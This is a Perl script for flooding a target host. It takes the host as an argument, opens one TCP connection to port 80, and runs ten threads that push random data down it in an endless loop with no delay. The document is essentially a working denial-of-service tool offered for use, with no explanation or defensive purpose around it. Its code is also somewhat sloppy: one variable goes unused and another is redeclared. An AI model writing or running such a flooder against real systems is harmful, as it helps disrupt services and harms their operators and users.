#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
use threads;

my $target_host = $ARGV[0] or die "Usage: $0 <target_host>\n";
my $iterations = 24000;
my $delay = 0;
my $packet_size = int(rand(1500 - 100 + 1)) + 100;

my $socket = IO::Socket::INET->new(
    Proto => 'tcp',
    Type => SOCK_STREAM,
    PeerHost => $target_host,
    PeerPort => 80
) or die "Could not create socket: $!\n";

sub send_packet {
    my ($local_port) = @_;
    my $packet_data = join("", map { chr(int(rand(256))) } 1..$packet_size);
    my $packet_size = int(rand(1500 - 100 + 1)) + 100;
    my $sent = 0;
    while (1) {
        my $result = $socket->send($packet_data);
        last unless $result;
        $sent += $result;
        sleep($delay);
    }
    print "Thread $local_port sent $sent bytes\n";
}

my $thread_count = 10;
my @threads;
for (my $i = 0; $i < $thread_count; $i++) {
    push @threads, threads->create(\&send_packet, int(rand(65535)));
}

foreach my $thread (@threads) {
    $thread->join();
}

close($socket);
